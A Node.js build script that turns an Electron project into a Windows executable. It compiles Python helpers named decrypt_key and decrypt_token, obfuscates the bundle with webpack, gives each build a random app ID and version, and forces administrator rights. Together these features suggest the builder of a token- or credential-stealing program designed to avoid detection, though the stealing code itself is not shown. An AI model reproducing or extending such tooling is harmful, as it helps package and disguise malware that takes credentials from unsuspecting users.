const builder = require('electron-builder');
const { copyFileSync, rmSync, existsSync } = require('fs');
const { join } = require('path');
const { execSync } = require('child_process');
const pngToIco = require('png-to-ico');

(async () => {
  if (existsSync(join(__dirname, 'assets', 'icon.png'))) {
    console.log('Converting icon into a .ico file...');
    await pngToIco(join('assets', 'icon.png'));
    console.log('Done conversion.');
  }

  console.log('Converting Python files into exe files...');
  const command = 'pyinstaller --onefile --icon=NONE --distpath . ';
  await execSync(command + 'decrypt_key.py', { cwd: join(__dirname, 'util', 'decrypt-key'), stdio: 'ignore' });
  await execSync(command + 'decrypt_token.py', { cwd: join(__dirname, 'util', 'decrypt-token'), stdio: 'ignore' });
  console.log('Done Python to exe conversion.');

  if (existsSync(join(__dirname, 'dist'))) {
    await rmSync(join(__dirname, 'dist'), { recursive: true });
  }

  console.log('Minifying and obfuscating code...');
  execSync('npx webpack', { stdio: 'pipe' });
  console.log('Done minifying and obfuscating.');

  // Copy decryptors to the "dist" folder
  copyFileSync(join(__dirname, 'util', 'decrypt-key', 'decrypt_key.exe'), join(__dirname, 'dist', 'decrypt_key.exe'));
  copyFileSync(join(__dirname, 'util', 'decrypt-token', 'decrypt_token.exe'), join(__dirname, 'dist', 'decrypt_token.exe'));

  function randomString(length) {
    let result = '';
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
  }

  console.log('Building electron executable...');
  // Build the executable
  builder.build({
    targets: builder.Platform.WINDOWS.createTarget(),
    config: {
      appId: 'com.' + randomString(16),
      productName: require('./config').name,
      executableName: require('./config').filename,
      icon: existsSync('icon.ico') ? './icon.ico' : undefined,
      compression: 'maximum',
      buildVersion: `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`,
      artifactName: require('./config').filename + '.exe',
      win: {
        requestedExecutionLevel: 'requireAdministrator', // Force launch as administrator
      },
      files: [
        'dist/*.bundle.js',
        'dist/*.exe',
        '!node_modules'
      ],
    }
  }).then((res) => {
    console.log(`\nDONE! Your executable can be found at: ${res[1]}`);
  });
})();
